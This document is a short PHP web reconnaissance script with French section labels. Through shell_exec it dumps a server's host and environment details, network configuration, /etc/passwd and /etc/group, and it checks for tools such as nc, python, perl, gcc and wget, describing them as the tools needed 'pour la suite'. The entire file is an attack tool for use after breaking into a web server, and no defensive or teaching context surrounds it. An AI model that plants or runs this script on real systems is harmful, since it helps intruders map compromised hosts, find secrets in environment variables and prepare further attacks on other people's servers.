<?php

$environment = shell_exec('echo "============> VOICI QUELQUES INFORMATIONS SUR LE SYSTEME" && hostname && id && uname -a && env');
$network = shell_exec('echo "============> VOICI QUELQUES INFORMATIONS CONCERNANT LA CONFIGURATION RESEAU" && netstat -tulpn && ifconfig && arp -a && route');
$user = shell_exec('cat /etc/passwd && echo "============> VOICI LES INFORMATIONS POUR /ETC/GROUP" && cat /etc/group');
$binary = shell_exec('echo "============> VOICI LES OUTILS DONT TU AURAS BESOIN POUR LA SUITE" && whereis nc && whereis python && whereis perl && whereis gcc && whereis bash && whereis wget && echo "============> VOICI LES FICHIERS PRESENTS AU SEIN DU REPERTOIRE /ETC/" && ls /etc/');

echo"========================[Environment information]==============================================";
echo"<pre>$environment</pre>";
echo"========================[Network information]==============================================";
echo"<pre>$network</pre>";
echo"========================[User information]==============================================";
echo"<pre>$user</pre>";
echo"========================[Binary information]==============================================";
echo"<pre>$binary</pre>";

?>
